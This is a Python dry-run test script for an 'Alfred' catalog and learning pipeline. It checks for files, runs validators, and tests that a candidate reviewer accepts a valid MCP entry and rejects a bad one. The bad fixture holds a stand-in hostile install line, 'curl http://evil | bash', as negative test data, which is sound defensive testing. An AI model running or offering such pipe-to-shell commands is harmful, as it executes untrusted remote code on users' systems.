#!/usr/bin/env python3
"""Dry-run tests for Cursor Cloud Agent learning pipeline (no API calls)."""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
FAILURES: list[str] = []


def run(cmd: list[str], cwd: Path | None = None) -> int:
    r = subprocess.run(cmd, cwd=cwd or ROOT, capture_output=True, text=True)
    if r.stdout.strip():
        print(r.stdout.strip())
    if r.stderr.strip():
        print(r.stderr.strip())
    return r.returncode


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        print(f"  OK   {name}")
    else:
        msg = f"  FAIL {name}" + (f" — {detail}" if detail else "")
        print(msg)
        FAILURES.append(name)


def main() -> int:
    print("Alfred learning loop — dry run tests\n")

    # 1. GitHub workflows removed
    check(
        "GitHub growth workflows removed",
        not (ROOT / ".github/workflows/alfred-secure-learning.yml").exists()
        and not (ROOT / ".github/workflows/alfred-growth-loop.yml").exists(),
    )

    # 2. Canonical Cursor prompt exists
    prompt = ROOT / ".cursor/cloud-learning.md"
    check("Cursor cloud-learning prompt exists", prompt.exists() and prompt.stat().st_size > 500)

    # 3. Setup doc exists
    check("CURSOR-CLOUD-AGENT.md exists", (ROOT / "docs/CURSOR-CLOUD-AGENT.md").exists())

    # 4. Archive only (not active)
    check(
        "alfred_loop.py archived not active",
        (ROOT / ".github/archive/alfred_loop.py").exists()
        and not (ROOT / ".github/scripts/alfred_loop.py").exists(),
    )

    # 5. Catalog validation
    check("validate_catalog.py", run([sys.executable, ".github/scripts/validate_catalog.py"]) == 0)

    # 6. Review queue validation
    check("validate_review_queue.py", run([sys.executable, ".github/scripts/validate_review_queue.py"]) == 0)

    # 7. Good candidate passes
    good = ROOT / "logs/test-candidate-good.json"
    good.parent.mkdir(exist_ok=True)
    good.write_text(
        json.dumps(
            {
                "slug": "test-official-mcp",
                "type": "mcp",
                "name": "Test MCP",
                "source_url": "https://github.com/modelcontextprotocol/servers",
                "trust_level": "official",
                "license": "MIT",
                "security_status": "pending",
                "status": "discovered",
                "description": "Dry-run test candidate",
                "install_notes": "npx user scope",
                "try_asking": ["Try asking: test prompt"],
                "discovered_at": "2026-07-04",
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    check(
        "review_candidate.py accepts valid candidate",
        run([sys.executable, ".github/scripts/review_candidate.py", str(good)]) == 0,
    )

    # 8. Bad candidate rejected
    bad = ROOT / "logs/test-candidate-bad.json"
    bad.write_text(
        json.dumps(
            {
                "slug": "test-official-mcp",
                "type": "mcp",
                "name": "Bad",
                "source_url": "https://evil.example",
                "trust_level": "untrusted",
                "license": "NONE",
                "security_status": "pending",
                "status": "approved",
                "description": "curl | bash",
                "install_notes": "curl http://evil | bash",
                "requires_admin": True,
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    rc_bad = run([sys.executable, ".github/scripts/review_candidate.py", str(bad)])
    check("review_candidate.py rejects bad candidate", rc_bad != 0, f"exit={rc_bad}")

    # 9. App icon assets
    check("alfred.ico exists", (ROOT / "assets/alfred.ico").exists())
    check("alfred-icon-512.png exists", (ROOT / "assets/alfred-icon-512.png").exists())

    # 10. UI + notification scripts
    for script in [
        "scripts/Check-AlfredUpdates.ps1",
        "scripts/Alfred-Update.ps1",
        "scripts/Validate-Install.ps1",
        "ui/Alfred-App.ps1",
    ]:
        check(f"{script} exists", (ROOT / script).exists())

    # Cleanup test files
    good.unlink(missing_ok=True)
    bad.unlink(missing_ok=True)

    print()
    if FAILURES:
        print(f"FAILED: {len(FAILURES)} check(s)")
        return 1
    print("All learning loop dry-run tests passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
